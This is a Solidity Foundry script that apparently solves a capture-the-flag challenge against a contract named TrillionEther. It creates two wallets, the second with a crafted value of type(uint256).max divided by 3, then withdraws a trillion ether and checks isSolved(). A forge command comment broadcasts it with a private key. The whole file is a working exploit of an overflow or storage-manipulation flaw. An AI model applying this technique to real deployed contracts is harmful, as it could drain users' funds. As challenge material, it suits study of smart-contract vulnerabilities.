// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {TrillionEther} from "../src/TrillionEther.sol";

// forge script script/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY -vvvvv --broadcast

contract ExploitScript is Script {
    function run(address trillionEtherAddr) public {
        vm.startBroadcast();
        TrillionEther trillionEther = TrillionEther(trillionEtherAddr);
        trillionEther.createWallet("");
        trillionEther.createWallet(bytes32(type(uint256).max / uint256(3)));
        trillionEther.withdraw(0, 1_000_000_000_000 ether);
        require(trillionEther.isSolved());
        vm.stopBroadcast();
    }
}
